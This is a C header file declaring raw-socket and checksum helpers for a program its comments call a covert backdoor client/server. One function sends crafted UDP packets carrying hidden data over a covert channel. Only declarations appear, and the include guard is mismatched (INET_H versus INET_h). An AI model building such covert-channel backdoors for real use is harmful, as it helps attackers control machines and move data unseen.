#ifndef INET_H
#define INET_h

/*
SOURCE FILE: inet.h

PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.

DATE: November 29, 2011

REVISIONS:
	1.0 - October 23
	1.1 - November 29, 2011

DESIGNERS:
	Craig Rowland
	Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
	Craig Rowland
	Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to send packets using raw sockets.  In this
	program it is primarily used to craft UDP packets. The checksum functions are adapted
	from algorithms found on the internet.
*/

#include "defs.h"

/*
FUNCTION: getaddr

PARAMS:
	int sock: The socket to attempt to get the address of.
	uint dst_addr: The address of the remote host.

RETURN: A valid source address based on the socket.

NOTES: Call this function to get a valid source address to use for outgoing packets.
*/
uint getaddr(int sock, uint dst_addr);

/*
FUNCTION: ip_csum

PARAMS:
	uint16 *hdr: The ip header in 16 bit words
	int num_words: The number of words in the header

RETURN: The checksum.

NOTES: Call this function to calculate the IP checksum.
*/
uint16 ip_csum(uint16 *hdr, int num_words);

/*
FUNCTION: udp_csum

PARAMS:
	uint16 *hdr: The ip header in 16 bit words
	int num_words: The number of words in the header

RETURN: none.

NOTES: Call this function to calculate the UDP checksum.
*/
uint16 udp_csum(uint16 *hdr, int num_words);

/*
FUNCTION: resolve

PARAMS:
	char *hostname: The hostname to resolve.

RETURN: none.

NOTES: Call this function to resolve a hostname to an IPV4 address.
*/
uint resolve(char *hostname);

/*
FUNCTION: _send

PARAMS:
	uint32 dst_addr: The destination address to send to.
	uint16 data: The data to send.
	uint16 dst_port: The destination port to send to.
	int chan: The covert channel to use.

RETURN: none.

NOTES: Call this function to craft and send a crafted packet with embedded
	covert data.
*/
void _send(uint32 dst_addr, uint16 data, uint16 dst_port, int chan);

#endif
